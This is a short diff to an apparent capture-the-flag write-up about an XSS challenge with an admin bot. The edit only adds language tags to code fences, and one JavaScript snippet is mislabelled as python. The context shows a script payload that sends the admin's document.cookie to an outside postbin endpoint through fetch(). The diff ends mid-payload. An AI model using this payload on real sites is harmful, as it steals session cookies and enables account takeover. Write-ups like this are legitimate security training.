@@ -17,7 +17,7 @@ in the first box and unsurprisingly, I get a pop-up with the age-old:
 The second form allows you to pass a URL to the 'admin' bot, and it will visit that page. 
 The source code is given to us and we can see the restrictions of the URL we pass in:
 
-```
+```python
 const validateRequest = (req) => {
     const url = req.query.url
     if (!url) {
@@ -46,7 +46,7 @@ const validateRequest = (req) => {
 
 We can craft a simple exploit to steal the admin's cookie and redirect it to our own server:
 
-```
+```javascript
 <script>
 fetch('https://www.toptal.com/developers/postbin/xxxx-xxxx?cookie='+document.cookie,{headers: {'Accept': ''}})
    .then(response => response.text())
